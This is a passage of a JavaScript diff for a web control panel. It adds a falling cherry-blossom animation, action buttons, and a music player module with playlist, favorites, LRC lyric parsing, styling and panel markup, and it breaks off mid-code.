+        _sakuraEnsureCanvas()
+        if (!_sakuraCtx) { setTimeout(startSakuraRain, 500); return }
+        // 初始铺满屏：让雨帘一开始就自然
+        if (_sakuraPetals.length < 40) {
+            var _w = _sakuraW || window.innerWidth
+            var _h = _sakuraH || window.innerHeight
+            for (var i = 0; i < 40; i++) {
+                _sakuraPetals.push({
+                    x: Math.random() * _w,
+                    y: Math.random() * _h,
+                    size: 7 + Math.random() * 9,
+                    color: PETAL_COLORS[Math.floor(Math.random() * PETAL_COLORS.length)],
+                    vx: (Math.random() * 1.2 - 0.6),
+                    vy: (0.6 + Math.random() * 1.2),
+                    rot: Math.random() * Math.PI * 2,
+                    vrot: (Math.random() * 0.04 - 0.02),
+                    sway: Math.random() * 0.02 + 0.006,
+                    swayPhase: Math.random() * Math.PI * 2,
+                    opacity: 0.5 + Math.random() * 0.5,
+                    state: 'fall',
+                    restRect: null,
+                    restOffset: 0,
+                    restWait: 0,
+                    slideVx: 0
+                })
+            }
+        }
+        // 定期补充新花瓣，保持恒定密度（小白菜雨帘感）
+        if (!_sakuraSpawnTimer) {
+            _sakuraSpawnTimer = setInterval(function() {
+                if (!_sakuraEnabled) return
+                if (_sakuraPetals.length < 80) _sakuraSpawn()
+            }, 150)
+        }
+        if (!_sakuraRaf) {
+            _sakuraLastTs = 0
+            _sakuraRaf = requestAnimationFrame(_sakuraLoop)
+        }
+    }
+
+    const toggleSakuraRain = () => {
+        _sakuraEnabled = !_sakuraEnabled
+        try { localStorage.setItem('smart_sakura_enabled', _sakuraEnabled ? '1' : '0') } catch(e) {}
+        if (!_sakuraEnabled) {
+            // 停止补充与渲染，清空画面
+            if (_sakuraSpawnTimer) { clearInterval(_sakuraSpawnTimer); _sakuraSpawnTimer = null }
+            if (_sakuraRaf) { cancelAnimationFrame(_sakuraRaf); _sakuraRaf = null }
+            _sakuraPetals = []
+            _sakuraLastTs = 0
+            if (_sakuraCtx && _sakuraW) _sakuraCtx.clearRect(0, 0, _sakuraW, _sakuraH)
+            createToast('樱花雨已关闭 🌸', 'pink', 2000)
+        } else {
+            startSakuraRain()
+            createToast('樱花雨已开启 🌸', 'pink', 2000)
+        }
+    }
+
+    // 启动樱花雨
+    startSakuraRain()
+
+
+    // 在标题栏添加樱花雨开关按钮
+    var sakuraToggleBtn = document.querySelector('#smart_sakura_toggle')
+    if (sakuraToggleBtn) {
+        sakuraToggleBtn.textContent = _sakuraEnabled ? '🌸 樱花' : '🥀 关闭'
+        sakuraToggleBtn.onclick = function() {
+            toggleSakuraRain()
+            sakuraToggleBtn.textContent = _sakuraEnabled ? '🌸 樱花' : '🥀 关闭'
+        }
+    }
+
+    const actionBox = document.querySelector('#SMART_action_box')
+    const scanBtn = document.createElement('button')
+    scanBtn.textContent = '📡 扫描设备'
+    scanBtn.className = 'smart_action_btn'
+    scanBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#06b6d4,#0891b2);color:white;border:1px solid rgba(103,232,249,.4);'
+    scanBtn.onclick = async () => {
+        if (!(await checkAdvanceFunc())) return createToast('未开启高级功能', 'red')
+        createToast('正在扫描...', 'pink', 3000)
+        await scanDevices()
+    }
+    actionBox.appendChild(scanBtn)
+
+    // 🎵 音乐播放器
+    var musicBtn = document.createElement('button')
+    musicBtn.textContent = '🎵 音乐'
+    musicBtn.className = 'smart_action_btn'
+    musicBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#f472b6,#ec4899);color:white;border:1px solid rgba(255,182,193,.4);'
+    musicBtn.onclick = function() { toggleMusicPlayer() }
+    actionBox.appendChild(musicBtn)
+
+    // 🤖 AI 智能助手
+    var aiBtn = document.createElement('button')
+    aiBtn.textContent = '🤖 AI助手'
+    aiBtn.className = 'smart_action_btn'
+    aiBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:white;border:1px solid rgba(196,181,253,.4);'
+    aiBtn.onclick = function() { toggleAIPanel() }
+    actionBox.appendChild(aiBtn)
+
+    // ============ 音乐播放器模块（歌词悬浮在屏幕底部居中） ============
+    // 【性能优化】延迟300ms加载，优先渲染主界面
+    setTimeout(function() {
+    ;(function() {
+        // ---- 状态 ----
+        var _playlist = []        // {url, title, lrc}
+        var _currentIndex = -1
+        var _audio = null
+        var _lrcData = []          // [{time, text}]
+        var _lrcLineIndex = -1
+        var _isPlaying = false
+        var _panelVisible = false
+        var _lyricsOverlayVisible = false
+        var _progressTimer = null
+        var _playMode = 'sequence'   // 'sequence' 顺序播放 | 'single' 单曲循环
+        var _retryCount = 0          // 播放失败重试计数（防止无限重试）
+        var _bgPlayEnabled = false   // 后台持续播放开关
+        var _wakeLock = null         // WakeLock 实例
+        var _bgKeepAliveTimer = null  // 后台保活定时器
+        var _autoPlayEnabled = false  // 打开页面自动续播
+
+        // ---- 从 localStorage 恢复 ----
+        try {
+            var saved = localStorage.getItem('smart_music_playlist')
+            if (saved) _playlist = JSON.parse(saved) || []
+        } catch(e) {}
+        try { _playMode = localStorage.getItem('smart_music_playmode') || 'sequence' } catch(e) {}
+        try { _bgPlayEnabled = localStorage.getItem('smart_music_bgplay') === '1' } catch(e) {}
+        try { _autoPlayEnabled = localStorage.getItem('smart_music_autoplay') === '1' } catch(e) {}
+
+        var savePlaylist = function() {
+            try { localStorage.setItem('smart_music_playlist', JSON.stringify(_playlist)) } catch(e) {}
+        }
+
+        // ---- 收藏列表 ----
+        var _favorites = []
+        try {
+            var savedFav = localStorage.getItem('smart_music_favorites')
+            if (savedFav) _favorites = JSON.parse(savedFav) || []
+        } catch(e) {}
+
+        var saveFavorites = function() {
+            try { localStorage.setItem('smart_music_favorites', JSON.stringify(_favorites)) } catch(e) {}
+        }
+
+        var isFavorited = function(songId) {
+            return _favorites.some(function(f) { return f.id === songId })
+        }
+
+        var toggleFavorite = function(song) {
+            if (!song || !song.id) return
+            var idx = _favorites.findIndex(function(f) { return f.id === song.id })
+            if (idx >= 0) {
+                _favorites.splice(idx, 1)
+                showToast('已取消收藏', 'pink', 1500)
+            } else {
+                _favorites.push({
+                    id: song.id,
+                    name: song.name || '',
+                    artists: song.artists || [],
+                    album: song.album || '',
+                    platform: song.platform || '',
+                    pfName: song.pfName || '',
+                    songId: song.songId || song.id || '',
+                    albumId: song.albumId || '',
+                    duration: song.duration || 0
+                })
+                showToast('已收藏: ' + (song.name || '未知'), 'green', 1500)
+            }
+            saveFavorites()
+            renderFavorites()
+            renderSearchResults()
+            renderPlaylist()
+        }
+
+        var renderFavorites = function() {
+            var container = document.getElementById('sm_favorites_container')
+            if (!container) return
+            if (!_favorites.length) {
+                container.innerHTML = '<div class="sm-empty" style="text-align:center;padding:30px 10px;color:rgba(255,255,255,.35);font-size:.75rem;">💗 暂无收藏<br><span style="font-size:.65rem;color:rgba(255,255,255,.25);">在搜索结果中点击 ♡ 即可收藏</span></div>'
+                return
+            }
+            var html = ''
+            for (var i = 0; i < _favorites.length; i++) {
+                var fav = _favorites[i]
+                var name = escapeHtml(fav.name || '未知歌曲')
+                var artists = escapeHtml((fav.artists || []).join(' / '))
+                var pfTag = fav.platform ? '<span class="sm-search-pf-tag _' + fav.platform + '">' + (fav.pfName || fav.platform) + '</span>' : ''
+                var isCurrent = _currentIndex >= 0 && _playlist[_currentIndex] && _playlist[_currentIndex].pfId === fav.id
+                html += '<div class="sm-fav-item' + (isCurrent ? ' _active' : '') + '" data-fav-idx="' + i + '">'
+                    + pfTag
+                    + '<span class="_fav-title">' + name + (artists ? ' - ' + artists : '') + '</span>'
+                    + '<span class="_fav-del" data-fav-del="' + i + '">✕</span>'
+                    + '</div>'
+            }
+            container.innerHTML = html
+        }
+
+        var playFavorite = async function(fav) {
+            if (!fav || !fav.id) return
+            // 检查是否已在播放列表
+            for (var i = 0; i < _playlist.length; i++) {
+                if (_playlist[i].pfId === fav.id) {
+                    // 验证已有URL是否仍然有效，如果失效则重新获取
+                    var existingUrl = _playlist[i].url || ''
+                    var urlValid = true
+                    if (existingUrl && _playlist[i].songRef) {
+                        urlValid = await validateAudioUrl(existingUrl)
+                    }
+                    if (urlValid) {
+                        loadSong(i)
+                        play()
+                        renderFavorites()
+                        return
+                    }
+                    // URL已过期，重新获取
+                    showToast('播放地址已过期，正在重新获取...', 'pink', 3000)
+                    var newUrl = await getPlayUrl(_playlist[i].songRef)
+                    if (newUrl) {
+                        _playlist[i].url = newUrl
+                        savePlaylist()
+                        renderPlaylist()
+                        loadSong(i)
+                        play()
+                        renderFavorites()
+                        return
+                    }
+                    // 重新获取也失败，从播放列表移除旧条目，走下方重新添加流程
+                    _playlist.splice(i, 1)
+                    savePlaylist()
+                    renderPlaylist()
+                    break
+                }
+            }
+            showToast('正在获取播放地址...', 'pink', 2000)
+            // 构造song对象
+            var song = {
+                id: fav.id,
+                name: fav.name,
+                artists: fav.artists || [],
+                album: fav.album || '',
+                platform: fav.platform || '',
+                pfName: fav.pfName || '',
+                songId: fav.songId || fav.id || '',
+                albumId: fav.albumId || '',
+                duration: fav.duration || 0
+            }
+            var playUrl = await getPlayUrl(song)
+            if (!playUrl) {
+                showToast('获取播放地址失败，该歌曲可能需要VIP', 'red', 4000)
+                return
+            }
+            var title = (fav.artists && fav.artists.length ? fav.artists.join(' / ') + ' - ' : '') + (fav.name || '未知歌曲')
+            _playlist.push({ url: playUrl, title: title, lrc: '', pfId: fav.id, platform: fav.platform, songRef: song })
+            savePlaylist()
+            renderPlaylist()
+            loadSong(_playlist.length - 1)
+            play()
+            renderFavorites()
+            showToast('正在播放: ' + title + ' [' + (_playMode === 'single' ? '单曲循环' : '顺序播放') + ']', 'green', 2500)
+            // 异步获取歌词
+            fetchLyricsForSong(song)
+        }
+
+        // ---- LRC 解析 ----
+        var parseLRC = function(lrcText) {
+            if (!lrcText || !lrcText.trim()) return []
+            var lines = lrcText.split('\n')
+            var result = []
+            var timeReg = /\[(\d{1,2}):(\d{1,2})(?:\.(\d{1,3}))?\]/g
+            for (var i = 0; i < lines.length; i++) {
+                var line = lines[i]
+                var matches = []
+                var m
+                timeReg.lastIndex = 0
+                while ((m = timeReg.exec(line)) !== null) {
+                    var min = parseInt(m[1]) || 0
+                    var sec = parseInt(m[2]) || 0
+                    var ms = m[3] ? parseInt(m[3]) : 0
+                    if (m[3] && m[3].length === 2) ms = parseInt(m[3]) * 10
+                    var time = min * 60 + sec + ms / 1000
+                    matches.push(time)
+                }
+                var text = line.replace(timeReg, '').trim()
+                if (matches.length === 0) continue
+                // 跳过元数据行（没有文本且有特殊标记）
+                if (!text && matches.length > 0) continue
+                for (var j = 0; j < matches.length; j++) {
+                    result.push({ time: matches[j], text: text })
+                }
+            }
+            result.sort(function(a, b) { return a.time - b.time })
+            return result
+        }
+
+        // ---- 查找当前歌词行 ----
+        var findLrcIndex = function(currentTime) {
+            if (!_lrcData.length) return -1
+            for (var i = _lrcData.length - 1; i >= 0; i--) {
+                if (currentTime >= _lrcData[i].time) return i
+            }
+            return -1
+        }
+
+        // ---- CSS 样式 ----
+        var style = document.createElement('style')
+        style.textContent = `
+        #smart_music_panel {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 380px; max-width: 92vw; max-height: 85vh; overflow-y: auto;
+            z-index: 100000; border-radius: 18px; padding: 0;
+            background: linear-gradient(135deg, rgba(30,20,35,.97), rgba(45,25,50,.97));
+            border: 1px solid rgba(255,182,193,.3);
+            box-shadow: 0 8px 40px rgba(0,0,0,.6), 0 0 0 1px rgba(255,182,193,.1);
+            display: none; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        #smart_music_panel._show { display: block; animation: smart_music_fadein .25s ease; }
+        @keyframes smart_music_fadein { from { opacity:0; transform:translate(-50%,-48%) } to { opacity:1; transform:translate(-50%,-50%) } }
+        #smart_music_overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,.45); z-index: 99999; display: none;
+        }
+        #smart_music_overlay._show { display: block; }
+        #smart_music_lyrics_bar {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            z-index: 100001; max-width: 80vw; text-align: center; cursor: grab;
+            display: none; user-select: none; -webkit-user-select: none;
+            touch-action: none;
+        }
+        #smart_music_lyrics_bar._dragging { cursor: grabbing; opacity: .85; }
+        #smart_music_lyrics_bar._show { display: block; animation: smart_lyric_pop .3s ease; }
+        @keyframes smart_lyric_pop { from { opacity:0; transform:translateX(-50%) translateY(8px) } to { opacity:1; transform:translateX(-50%) translateY(0) } }
+        #smart_music_lyrics_bar .lyric-current {
+            font-size: 18px; font-weight: 900; line-height: 1.5;
+            color: #fff;
+            text-shadow: 
+                0 0 2px #000,
+                0 0 4px #000,
+                0 0 8px rgba(0,0,0,.8),
+                0 2px 6px rgba(0,0,0,.9),
+                0 0 20px rgba(255,182,193,.5);
+            background: linear-gradient(135deg, rgba(0,0,0,.65), rgba(20,10,30,.7));
+            backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+            padding: 12px 32px; border-radius: 32px;
+            border: 2px solid rgba(255,182,193,.35);
+            box-shadow: 
+                0 6px 28px rgba(0,0,0,.5),
+                0 0 0 1px rgba(255,255,255,.06),
+                inset 0 1px 0 rgba(255,255,255,.1);
+            display: inline-block; max-width: 80vw; word-break: break-word;
+            letter-spacing: .3px;
+        }
+        #smart_music_lyrics_bar .lyric-next {
+            font-size: 13px; color: rgba(255,255,255,.7); margin-top: 6px;
+            text-shadow: 0 1px 4px rgba(0,0,0,.9), 0 0 6px rgba(0,0,0,.6);
+            font-weight: 500;
+        }
+        .sm-section { padding: 12px 16px; }
+        .sm-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 14px 16px; border-bottom: 1px solid rgba(255,182,193,.15);
+            background: linear-gradient(135deg, rgba(255,182,193,.08), rgba(167,139,250,.06));
+            border-radius: 18px 18px 0 0;
+        }
+        .sm-title { font-size: 15px; font-weight: bold; background: linear-gradient(90deg,#ff9ecd,#a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .sm-close { background: rgba(255,255,255,.1); border: none; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center; transition: all .2s; }
+        .sm-close:hover { background: rgba(255,100,100,.3); }
+        .sm-input {
+            width: 100%; box-sizing: border-box; padding: 8px 12px; border-radius: 10px;
+            border: 1px solid rgba(255,182,193,.2); background: rgba(255,255,255,.06);
+            color: #fff; font-size: 13px; outline: none; transition: border-color .2s;
+        }
+        .sm-input:focus { border-color: rgba(255,182,193,.5); }
+        .sm-input::placeholder { color: rgba(255,255,255,.35); }
+        .sm-btn {
+            border: none; border-radius: 10px; padding: 8px 16px; font-size: 13px;
+            font-weight: bold; color: #fff; cursor: pointer; transition: all .2s;
+        }
+        .sm-btn:active { transform: scale(.95); }
+        .sm-btn-add { background: linear-gradient(135deg,#f472b6,#ec4899); }
+        .sm-btn-play { background: linear-gradient(135deg,#22c55e,#16a34a); }
+        .sm-btn-pause { background: linear-gradient(135deg,#f59e0b,#d97706); }
+        .sm-btn-prev { background: linear-gradient(135deg,#60a5fa,#3b82f6); }
+        .sm-btn-next { background: linear-gradient(135deg,#60a5fa,#3b82f6); }
+        .sm-btn-lrc { background: linear-gradient(135deg,#a78bfa,#8b5cf6); }
+        .sm-btn-scan { background: linear-gradient(135deg,#06b6d4,#0891b2); }
+        .sm-btn-del { background: rgba(239,68,68,.2); color: rgba(252,165,165,1); border: 1px solid rgba(239,68,68,.3); padding: 4px 10px; font-size: 11px; }
+        .sm-btn-del:hover { background: rgba(239,68,68,.35); }
+        .sm-playlist-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 8px 12px; border-radius: 10px; margin-bottom: 4px;
+            background: rgba(255,255,255,.04); border: 1px solid transparent;
+            cursor: pointer; transition: all .15s; font-size: 13px;
+        }
+        .sm-playlist-item:hover { background: rgba(255,182,193,.08); }
+        .sm-playlist-item._active { background: linear-gradient(135deg, rgba(255,182,193,.15), rgba(167,139,250,.1)); border-color: rgba(255,182,193,.3); }
+        .sm-playlist-item ._title { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .sm-playlist-item ._del { flex-shrink: 0; margin-left: 8px; }
+        .sm-fav-item { display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;cursor:pointer;transition:background .2s;border:1px solid transparent; }
+        .sm-fav-item:hover { background:rgba(244,114,182,.08);border-color:rgba(244,114,182,.12); }
+        .sm-fav-item._active { background:linear-gradient(135deg,rgba(244,114,182,.12),rgba(236,72,153,.08));border-color:rgba(244,114,182,.2); }
+        .sm-fav-item ._fav-title { flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.72rem;color:#e2e8f0; }
+        .sm-fav-item ._fav-pf { font-size:.6rem;padding:1px 5px;border-radius:4px;flex-shrink:0; }
+        .sm-fav-item ._fav-del { flex-shrink:0;font-size:.6rem;color:#f87171;cursor:pointer;padding:2px 6px;border-radius:4px; }
+        .sm-fav-item ._fav-del:hover { background:rgba(248,113,113,.15); }
+        .sm-fav-btn { cursor:pointer;font-size:.85rem;flex-shrink:0;padding:2px 4px;transition:transform .15s; }
+        .sm-fav-btn:hover { transform:scale(1.2); }
+        .sm-fav-btn._active { color:#f472b6; }
+        .sm-controls { display: flex; align-items: center; gap: 8px; justify-content: center; flex-wrap: wrap; }
+        .sm-seek-wrap { width: 100%; margin-top: 8px; display: flex; align-items: center; gap: 8px; }
+        .sm-seek-bar { flex: 1; height: 5px; border-radius: 3px; background: rgba(255,255,255,.15); cursor: pointer; position: relative; overflow: hidden; }
+        .sm-seek-fill { height: 100%; border-radius: 3px; background: linear-gradient(90deg,#ff9ecd,#a78bfa); width: 0%; transition: width .1s linear; }
+        .sm-time { font-size: 11px; color: rgba(255,255,255,.5); font-variant-numeric: tabular-nums; min-width: 36px; text-align: center; }
+        .sm-vol-wrap { display: flex; align-items: center; gap: 6px; width: 100%; margin-top: 6px; }
+        .sm-vol-bar { flex: 1; height: 4px; border-radius: 2px; background: rgba(255,255,255,.15); cursor: pointer; position: relative; overflow: hidden; }
+        .sm-vol-fill { height: 100%; border-radius: 2px; background: linear-gradient(90deg,#4ade80,#22c55e); width: 80%; }
+        .sm-tab-bar { display: flex; gap: 4px; margin-bottom: 10px; }
+        .sm-tab { flex: 1; text-align: center; padding: 8px; border-radius: 10px; font-size: 13px; font-weight: bold; cursor: pointer; background: rgba(255,255,255,.05); color: rgba(255,255,255,.5); border: 1px solid transparent; transition: all .2s; }
+        .sm-tab._active { background: linear-gradient(135deg, rgba(255,182,193,.15), rgba(167,139,250,.1)); color: #ff9ecd; border-color: rgba(255,182,193,.25); }
+        .sm-lrc-area { width: 100%; box-sizing: border-box; height: 120px; resize: vertical; padding: 10px; border-radius: 10px; border: 1px solid rgba(255,182,193,.2); background: rgba(255,255,255,.06); color: #fff; font-size: 12px; line-height: 1.6; outline: none; font-family: monospace; }
+        .sm-lrc-area:focus { border-color: rgba(255,182,193,.5); }
+        .sm-now-playing { text-align: center; font-size: 13px; font-weight: bold; color: #ff9ecd; margin-bottom: 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .sm-empty { text-align: center; padding: 20px; color: rgba(255,255,255,.3); font-size: 13px; }
+        .sm-hint { font-size: 11px; color: rgba(255,255,255,.3); margin-top: 6px; line-height: 1.5; }
+        .sm-toggle-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+        .sm-switch { position: relative; width: 40px; height: 22px; border-radius: 11px; background: rgba(255,255,255,.15); cursor: pointer; transition: background .25s; flex-shrink: 0; }
+        .sm-switch._on { background: linear-gradient(135deg,#ff9ecd,#a78bfa); }
+        .sm-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; border-radius: 50%; background: #fff; transition: transform .25s; }
+        .sm-switch._on::after { transform: translateX(18px); }
+        .sm-switch-label { font-size: 12px; color: rgba(255,255,255,.7); }
+        .sm-search-item { display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-radius:10px;margin-bottom:4px;background:rgba(255,255,255,.04);border:1px solid transparent;cursor:pointer;transition:all .15s; }
+        .sm-search-item:hover { background:rgba(255,100,100,.08);border-color:rgba(255,100,100,.15); }
+        .sm-search-item._loading { opacity:.4;pointer-events:none; }
+        .sm-search-info { flex:1;overflow:hidden; }
+        .sm-search-title { font-size:12px;font-weight:bold;color:#fff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap; }
+        .sm-search-artist { font-size:10px;color:rgba(255,255,255,.4);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap; }
+        .sm-search-dur { font-size:10px;color:rgba(255,255,255,.3);flex-shrink:0;margin-left:6px; }
+        .sm-search-playing { color:#4ade80;font-size:10px;flex-shrink:0;margin-left:6px; }
+        .sm-search-loading { text-align:center;padding:16px;color:rgba(255,255,255,.3);font-size:12px; }
+        .sm-pf-btn { font-size:10px;padding:2px 10px;border-radius:8px;cursor:pointer;background:rgba(255,255,255,.05);color:rgba(255,255,255,.4);border:1px solid transparent;transition:all .2s; }
+        .sm-pf-btn._on { background:rgba(236,72,153,.15);color:#f9a8d4;border-color:rgba(236,72,153,.3); }
+        .sm-pf-btn._searching { background:rgba(99,102,241,.2);color:#a5b4fc;border-color:rgba(99,102,241,.3); }
+        .sm-search-pf-tag { font-size:9px;padding:1px 6px;border-radius:6px;margin-right:4px;font-weight:bold;display:inline-block;flex-shrink:0; }
+        .sm-search-pf-tag._netease { background:rgba(239,68,68,.15);color:#f87171; }
+        .sm-search-pf-tag._qq { background:rgba(59,130,246,.15);color:#60a5fa; }
+        .sm-search-pf-tag._kugou { background:rgba(34,197,94,.15);color:#4ade80; }
+        .sm-search-pf-tag._kuwo { background:rgba(234,179,8,.15);color:#fbbf24; }
+        .sm-search-pf-tag._migu { background:rgba(168,85,247,.15);color:#c084fc; }
+        `
+        document.head.appendChild(style)
+
+        // ---- 创建面板 HTML ----
+        var overlay = document.createElement('div')
+        overlay.id = 'smart_music_overlay'
+        document.body.appendChild(overlay)
+
+        var panel = document.createElement('div')
+        panel.id = 'smart_music_panel'
+        panel.innerHTML = `
+            <div class="sm-header">
+                <span class="sm-title">🎵 音乐播放器</span>
+                <div style="display:flex;align-items:center;">
+                    <span class="sm-minimize-btn" id="sm_minimize_btn" title="最小化为小窗">📌</span>
+                    <button class="sm-close" id="sm_close_btn">×</button>
+                </div>
+            </div>
+
+            <div class="sm-section">
+                <div class="sm-now-playing" id="sm_now_playing">未播放</div>
+                <div class="sm-controls">
+                    <button class="sm-btn sm-btn-prev" id="sm_prev_btn">⏮</button>
+                    <button class="sm-btn sm-btn-play" id="sm_play_btn" style="min-width:64px">▶ 播放</button>
+                    <button class="sm-btn sm-btn-next" id="sm_next_btn">⏭</button>
+                    <button class="sm-btn" id="sm_mode_btn" style="min-width:48px;font-size:14px;background:linear-gradient(135deg,#f59e0b,#d97706);" title="点击切换播放模式">🔁</button>
+                </div>
+                <div class="sm-seek-wrap">
+                    <span class="sm-time" id="sm_cur_time">0:00</span>
+                    <div class="sm-seek-bar" id="sm_seek_bar"><div class="sm-seek-fill" id="sm_seek_fill"></div></div>
+                    <span class="sm-time" id="sm_dur_time">0:00</span>
+                </div>
+                <div class="sm-vol-wrap">
+                    <span style="font-size:12px">🔊</span>
+                    <div class="sm-vol-bar" id="sm_vol_bar"><div class="sm-vol-fill" id="sm_vol_fill"></div></div>
+                    <span class="sm-time" id="sm_vol_pct">80%</span>
+                </div>
+                <div style="display:flex;align-items:center;justify-content:center;gap:12px;margin-top:6px;">
+                    <div style="display:flex;align-items:center;gap:6px;">
+                        <span style="font-size:.5rem;opacity:.6;">后台播放</span>
+                        <span class="sm-bg-switch" id="sm_bg_switch" title="开启后音乐在后台持续播放"></span>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:6px;">
+                        <span class="sm-autoplay-label" style="font-size:.5rem;opacity:.6;">⏯ 自动续播</span>
+                        <span class="sm-bg-switch" id="sm_autoplay_switch" title="开启后打开页面自动播放上次的歌曲"></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sm-adb-section">
+                <div style="font-size:.6rem;font-weight:bold;margin-bottom:6px;color:#60a5fa;">📱 设备播放</div>
+                <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
+                    <button class="sm-adb-btn" id="sm_adb_play_btn">▶ 推送到设备播放</button>
+                    <button class="sm-adb-btn" id="sm_adb_stop_btn" style="background:linear-gradient(135deg,#ef4444,#dc2626);">⏹ 停止设备播放</button>
+                </div>
+                <div class="sm-adb-status" id="sm_adb_status">未连接设备</div>
+            </div>
+
+            <div class="sm-adb-section" style="background:linear-gradient(135deg,rgba(167,139,250,.08),rgba(236,72,153,.04));border-color:rgba(167,139,250,.2);">
+                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
+                    <div style="font-size:.6rem;font-weight:bold;background:linear-gradient(135deg,#a78bfa,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">🔮 高级后台同步</div>
+                    <span class="sm-bg-switch" id="sm_bgsync_switch" style="width:32px;height:18px;" title="开启后同步系统后台播放的音乐"></span>
+                </div>
+                <div style="display:flex;gap:6px;justify-content:center;flex-wrap:wrap;">
+                    <button class="sm-adb-btn" id="sm_bg_prev_btn" style="background:linear-gradient(135deg,#8b5cf6,#6366f1);min-width:44px;">⏮</button>
+                    <button class="sm-adb-btn" id="sm_bg_play_btn" style="background:linear-gradient(135deg,#10b981,#059669);min-width:60px;">▶ 播放</button>
+                    <button class="sm-adb-btn" id="sm_bg_next_btn" style="background:linear-gradient(135deg,#8b5cf6,#6366f1);min-width:44px;">⏭</button>
+                </div>
+                <div class="sm-adb-status" id="sm_bgsync_status">未开启同步</div>
+            </div>
+
+            <div class="sm-section" style="border-top:1px solid rgba(255,182,193,.1)">
+                <div class="sm-tab-bar">
+                    <div class="sm-tab _active" id="sm_tab_playlist">📋 播放列表</div>
+                    <div class="sm-tab" id="sm_tab_favorites">❤️ 收藏</div>
+                    <div class="sm-tab" id="sm_tab_lyrics">🎤 歌词</div>
+                </div>
+
+                <div id="sm_playlist_tab">
+                    <div style="display:flex;gap:6px;margin-bottom:8px;">
+                        <input type="text" class="sm-input" id="sm_search_input" placeholder="搜索歌曲/歌手（多平台聚合）..." style="flex:1" />
+                        <button class="sm-btn sm-btn-search" id="sm_search_btn" style="background:linear-gradient(135deg,#ec4899,#8b5cf6)">🔍 Listen1搜索</button>
+                    </div>
+                    <div style="display:flex;gap:4px;margin-bottom:6px;flex-wrap:wrap;" id="sm_platform_filter">
+                        <span style="font-size:10px;color:rgba(255,255,255,.4);padding:2px 6px;">平台:</span>
+                        <span class="sm-pf-btn _on" data-pf="netease">网易云</span>
+                        <span class="sm-pf-btn _on" data-pf="qq">QQ音乐</span>
+                        <span class="sm-pf-btn _on" data-pf="kugou">酷狗</span>
+                        <span class="sm-pf-btn _on" data-pf="kuwo">酷我</span>
+                        <span class="sm-pf-btn _on" data-pf="migu">咪咕</span>
+                    </div>
+                    <div id="sm_search_results" style="max-height:260px;overflow-y:auto;margin-bottom:10px;display:none"></div>
+                    <div style="display:flex;gap:6px;margin-bottom:8px;border-top:1px dashed rgba(255,182,193,.12);padding-top:8px;">
+                        <input type="text" class="sm-input" id="sm_url_input" placeholder="或粘贴音频直链 URL" style="flex:1" />
+                        <input type="text" class="sm-input" id="sm_title_input" placeholder="歌名" style="width:90px" />
+                    </div>
+                    <div style="display:flex;gap:6px;margin-bottom:10px;">
+                        <button class="sm-btn sm-btn-add" id="sm_add_btn" style="flex:1">➕ 添加</button>
+                        <button class="sm-btn sm-btn-scan" id="sm_scan_btn">📱 扫描本地</button>
+                    </div>
+                    <div id="sm_playlist_container" style="max-height:200px;overflow-y:auto"></div>
+                </div>
+
+                <div id="sm_favorites_tab" style="display:none">
+                    <div id="sm_favorites_container" style="max-height:350px;overflow-y:auto"></div>
+                </div>
+
+                <div id="sm_lyrics_tab" style="display:none">
+                    <div style="display:flex;gap:6px;margin-bottom:8px;">
+                        <input type="text" class="sm-input" id="sm_lrc_url_input" placeholder="粘贴 LRC 歌词直链 URL（可选）" style="flex:1" />
+                        <button class="sm-btn sm-btn-scan" id="sm_fetch_lrc_btn">获取</button>
+                    </div>
+                    <textarea class="sm-lrc-area" id="sm_lrc_textarea" placeholder="粘贴 LRC 歌词到这里，格式：&#10;[00:12.34]这是第一句歌词&#10;[00:18.56]这是第二句歌词&#10;&#10;或粘贴纯文本歌词，将逐行滚动显示"></textarea>
+                    <div style="display:flex;gap:6px;margin-top:8px;">
+                        <button class="sm-btn sm-btn-lrc" id="sm_apply_lrc_btn" style="flex:1">✅ 应用歌词</button>
+                        <button class="sm-btn sm-btn-lrc" id="sm_save_lrc_btn" style="background:linear-gradient(135deg,#06b6d4,#0891b2)">💾 存到歌曲</button>
+                    </div>
+                    <div class="sm-toggle-row" style="margin-top:10px">
+                        <span class="sm-switch-label">歌词悬浮条（屏幕底部居中）</span>
+                        <div class="sm-switch _on" id="sm_lyrics_toggle"></div>
+                    </div>
+                    <div class="sm-hint">开启后，播放时歌词会以悬浮条形式显示在屏幕底部居中位置，支持时间同步滚动</div>
+                </div>
+            </div>
+        `
+        document.body.appendChild(panel)
+
+        // ---- 歌词悬浮条 ----
+        var lyricsBar = document.createElement('div')
+        lyricsBar.id = 'smart_music_lyrics_bar'
+        lyricsBar.innerHTML = '<div class="lyric-current" id="sm_lyric_cur">🎵</div><div class="lyric-next" id="sm_lyric_next"></div>'
